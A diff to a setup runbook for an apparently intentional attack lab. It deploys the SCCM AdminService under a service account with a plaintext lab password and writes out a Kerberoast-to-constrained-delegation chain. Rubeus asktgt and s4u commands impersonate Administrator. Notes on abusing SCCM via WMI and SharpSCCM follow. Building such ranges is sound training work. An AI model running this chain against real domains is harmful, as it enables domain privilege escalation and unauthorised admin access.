@@ -191,6 +191,65 @@ Run the SCCM setup wizard and follow the screen-by-screen options below. Install
 
 ---
 
+## Phase 6A — Deploy the SCCM AdminService (REQUIRED for WT037 CMPivot / WT039 script-run / CD chain)
+
+> **Why this phase exists (2026-08-01):** The SCCM **AdminService** (`/AdminService` REST API) powers **CMPivot (WT037)** and **script-run (WT039)**. It is **NOT deployed** on mbr02 after Phase 6 (verified: no `AdminService` IIS app pool, no web app, no `bin\AdminService` dir). The `Kerberoast svc_sccm → CD → AdminService` chain (see `05-ad-attack-surface.yml` WT#6: `svc_sccm` owns `HTTP/mbr02.range.local` + `msDS-AllowedToDelegateTo=HTTP/mbr02.range.local`) has **no target** until this service is deployed. Without it, `https://mbr02.range.local/AdminService/` returns IIS 401 for a non-existent app — NOT an auth challenge.
+
+### Deploy via SCCM Console (GUI, on mbr02)
+
+1. Open **SCCM Console** on mbr02.
+2. **Administration** → **Site Configuration** → **Servers and Site System Roles**.
+3. Select `MBR02.RANGE.LOCAL` → top ribbon **Add Site System Role** (or Properties → add role).
+4. In the wizard, select the **SMS Provider** role and ensure the **AdminService** option is enabled (in Current Branch 2309+ the AdminService is deployed as part of the SMS Provider role).
+5. Complete the wizard. SCCM deploys the **AdminService** web app under the Default Web Site (`/AdminService`) with its own app pool (`AdminService`).
+
+### Set the AdminService app pool identity to `RANGE\svc_sccm` (CRITICAL for the CD attack)
+
+Because the `HTTP/mbr02.range.local` SPN is registered on **`svc_sccm`** (not `mbr02$` — intentional, `05-ad-attack-surface.yml`), tickets for that SPN are encrypted with **svc_sccm's** key. The AdminService pool MUST run as `svc_sccm` so it can decrypt the S4U2Proxy ticket from the CD chain. With the default machine/NetworkService identity the CD ticket will NOT decrypt → 401.
+
+```powershell
+Import-Module WebAdministration
+Set-ItemProperty "IIS:\AppPools\AdminService" -Name processModel -Value @{
+    identityType = 3;               # 3 = SpecificUser
+    userName     = "RANGE\svc_sccm"
+    password     = "s3rv1c3_SCCM!"
+}
+iisreset
+# Equivalent: appcmd set apppool "AdminService" /processModel.identityType:SpecificUser /processModel.userName:"RANGE\svc_sccm" /processModel.password:"s3rv1c3_SCCM!"
+```
+
+### Verify deployment
+
+```powershell
+& "$env:windir\system32\inetsrv\appcmd.exe" list apps | findstr /i AdminService
+# Expect: APP "Default Web Site/AdminService" (applicationPool:AdminService)
+
+Test-Path "C:\Program Files\Microsoft Configuration Manager\bin\AdminService"
+# Expect: True
+
+Import-Module WebAdministration
+(Get-ItemProperty "IIS:\AppPools\AdminService").processModel.userName
+# Expect: RANGE\svc_sccm
+
+# From any machine as svc_sccm (explicit creds), expect HTTP 200 (was 401):
+Invoke-WebRequest -Uri "https://mbr02.range.local/AdminService/wmi/" -Credential (svc_sccm) -UseBasicParsing
+```
+
+### Executing the intended chain (post-deploy)
+
+```powershell
+# 1. Kerberoast svc_sccm (WT033 — already verified): SPN HTTP/mbr02.range.local -> crack -> s3rv1c3_SCCM!
+# 2. S4U2Self + S4U2Proxy as Administrator to HTTP/mbr02.range.local:
+Rubeus.exe asktgt /user:svc_sccm /domain:range.local /aes256:<key> /ptt
+Rubeus.exe s4u /user:svc_sccm /aes256:<key> /impersonateuser:administrator /msdsspn:"HTTP/mbr02.range.local" /ptt
+# 3. Ticket for HTTP/mbr02 as Administrator in cache -> AdminService grants admin:
+Invoke-WebRequest -Uri "https://mbr02.range.local/AdminService/wmi/" -UseBasicParsing   # 200 as Administrator
+```
+
+> **Do NOT move/remove the `HTTP/mbr02.range.local` SPN from `svc_sccm`** — it is the campaign's cross-forest Kerberoast + CD target. The pool identity (not the SPN) is what makes the chain work.
+
+---
+
 ## Phase 7 — Apply SCCM Misconfigurations (Attack Surface) — SCCM Console GUI
 
 After SCCM is installed and running. **Do NOT use WMI** — the WMI approach fails on Server 2025. Use the SCCM Console GUI for all three:
@@ -245,6 +304,19 @@ $admin.AdminSid = $sid
 $admin.AdminType = 1; $admin.CategoryType = 1; $admin.CollectionID = "SMS00001"
 $admin.Put()
 ```
+
+---
+
+## Branch C Validation Findings (2026-08-01)
+
+Verified live as `range\svc_sccm` (SMS Provider WMI, explicit creds from ws01). Read these before running Branch C:
+
+- **SCCM admin gate = local `SMS Admins` group** on mbr02 (not just the SCCM security role). Members: `RANGE\svc_sccm`, `MBR02\vagrant`, `CADRE\chief_command`, `CADRE\analyst_purple` (cross-forest cadre.local admins — SCCM Full Admins on the range.local site).
+- **`HTTP/mbr02.range.local` SPN is registered on `svc_sccm`**, NOT on `mbr02$` (intentional — `05-ad-attack-surface.yml`), plus `msDS-AllowedToDelegateTo = HTTP/mbr02.range.local` (constrained delegation). Consequence: **AdminService (CMPivot, script-run) is Kerberos-broken for normal admin logons** (HTTP service tickets encrypt for svc_sccm → IIS on mbr02 can't decrypt → 401). The intended AdminService access path is post-Kerberoast **S4U2Self → S4U2Proxy to HTTP/mbr02**. Do NOT "fix" this SPN — it is the campaign's cross-forest Kerberoast + CD attack target.
+- **`cifs/mbr02.range.local` SPN is MISSING** from AD → SMB Kerberos to mbr02 fails (NTLM-only). Keep in mind for Kerberos-based tooling (`/ptt`, `-k`); PowerShell WMI with explicit `-Credential` works (NTLM).
+- **Scripts**: `SMS_Scripts.CreateScripts` works via WMI (caller-generated `ScriptGuid` required). Approval (`UpdateApprovalState`) = Generic failure (deprecated); execution task is read-only; run-script needs AdminService.
+- **App deploy**: `SMS_Package` + `SMS_Program` (SYSTEM via `ProgramFlags=2`) create fine via WMI. `SMS_Advertisement.Put` = Generic failure via raw WMI (needs console).
+- **SharpSCCM v2.0.13**: uses `-mp`/`-sms` (not v1 `-s`); `get naa`/`get secrets` need a computer account or PXE cert (`-c`)+media GUID (`-m`); `get`/`exec` use the current session token (no `-u/-p`) — replicate with PowerShell WMI + explicit creds, or run as the account via Rubeus `createnetonly` (needs `cifs` SPN for SMB paths).
 
 ---
 
